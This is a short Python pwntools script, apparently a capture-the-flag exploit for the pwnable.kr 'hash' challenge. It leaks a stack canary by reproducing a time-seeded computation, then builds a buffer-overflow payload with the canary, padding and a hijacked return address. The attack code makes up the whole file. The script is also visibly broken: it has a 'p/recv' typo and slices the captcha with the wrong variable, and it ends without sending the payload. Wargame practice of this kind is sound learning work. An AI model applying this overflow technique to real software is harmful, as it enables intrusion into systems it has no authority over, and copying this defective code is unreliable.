import os 
import time 
from pwn import *

p = remote("pwnable.kr", 9002)
t = int(time.time())
print(p/recv("captcha"))
captcha = p.recvline()
captchapos = captcha.find(' : ')+len(' : ')
captcha = captcha[captcha:].strip()
p.sendline(captcha)
print(p.recvline())
print(p.recvline())
cmd = "./hash %s %s" % (t, captcha)
cookie = "0x" + os.popen(cmd).read().strip()
print(cookie)

payload = 'A' * 512
payload += p32(int(cookie, 16))
payload += 'A' * 12

payload += p32(0x8049187)
payload += p32(0x804B0E0 + 537*4/3)
















